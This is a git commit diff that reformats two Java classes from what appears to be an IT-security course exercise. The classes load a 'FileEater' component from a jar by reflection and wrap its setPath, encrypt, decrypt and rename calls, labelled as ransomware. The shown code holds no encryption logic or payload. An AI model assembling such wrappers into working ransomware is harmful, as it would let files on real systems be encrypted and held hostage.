4a8c53030aa9cc86397d3bd691f2952753f34d39
Robin Wollenschlaeger <r.wollenschlaeger@goettfert.de>
2022-02-22 10:53:40 +0100

    bump submodule

--- src/main/java/LeverageCom/RansomwareFactory.java
+++ src/main/java/LeverageCom/RansomwareFactory.java
@@ -1,25 +1,26 @@
 package leverageCom;
+
+import configuration.Configuration;
+
 import java.io.File;
 import java.net.URL;
 import java.net.URLClassLoader;
-import configuration.Configuration;
-
 
 
 public class RansomwareFactory {
     @SuppressWarnings("unchecked")
-    public static Object build(){
+    public static Object build() {
         Object compPort = null;
 
         try {
-            URL[] urls = {new File(Configuration.instance.pathToJavaArchive+"ITSec1_Crypto_Component.jar").toURI().toURL()};
+            URL[] urls = {new File(Configuration.instance.pathToJavaArchive + "ITSec1_Crypto_Component.jar").toURI().toURL()};
             URLClassLoader urlClassLoader = new URLClassLoader(urls, RansomwareFactory.class.getClassLoader());
             Class fileEaterClass = Class.forName("FileEater", true, urlClassLoader);
             Object fileEaterInstance = fileEaterClass.getMethod("getInstance").invoke(null);
             compPort = fileEaterClass.getDeclaredField("port").get(fileEaterInstance);
-        }catch (Exception ex){
-           System.err.println(ex.getMessage());
-           System.err.println(ex.getStackTrace());
+        } catch (Exception ex) {
+            System.err.println(ex.getMessage());
+            System.err.println(ex.getStackTrace());
         }
 
         return compPort;
--- src/main/java/LeverageCom/RansomwareReflector.java
+++ src/main/java/LeverageCom/RansomwareReflector.java
@@ -4,48 +4,49 @@ import java.lang.reflect.Method;
 
 public class RansomwareReflector {
     private Object port;
-    public RansomwareReflector(){
+
+    public RansomwareReflector() {
         this.port = RansomwareFactory.build();
     }
 
-    public String setPath(String path){
-        try{
+    public String setPath(String path) {
+        try {
             Method setPathMethod = port.getClass().getDeclaredMethod("setPath", String.class);
             return (String) setPathMethod.invoke(port, path);
-        }catch (Exception ex){
+        } catch (Exception ex) {
             System.err.println(ex.getMessage());
             System.err.println(ex.getStackTrace());
             return null;
         }
     }
 
-    public Boolean encrypt(){
-        try{
+    public Boolean encrypt() {
+        try {
             Method encryptMethod = port.getClass().getDeclaredMethod("encrypt");
             return (Boolean) encryptMethod.invoke(port);
-        }catch (Exception ex){
+        } catch (Exception ex) {
             System.err.println(ex.getMessage());
             System.err.println(ex.getStackTrace());
             return null;
         }
     }
 
-    public Boolean decrypt(){
-        try{
+    public Boolean decrypt() {
+        try {
             Method decryptMethod = port.getClass().getDeclaredMethod("decrypt");
             return (Boolean) decryptMethod.invoke(port);
-        }catch (Exception ex){
+        } catch (Exception ex) {
             System.err.println(ex.getMessage());
             System.err.println(ex.getStackTrace());
             return null;
         }
     }
 
-    public Boolean rename(String appendix, Boolean shouldBeAdded){
-        try{
+    public Boolean rename(String appendix, Boolean shouldBeAdded) {
+        try {
             Method renameMethod = port.getClass().getDeclaredMethod("rename", String.class, Boolean.class);
             return (Boolean) renameMethod.invoke(port, appendix, shouldBeAdded);
-        }catch (Exception ex){
+        } catch (Exception ex) {
             System.err.println(ex.getMessage());
             System.err.println(ex.getStackTrace());
             return null;
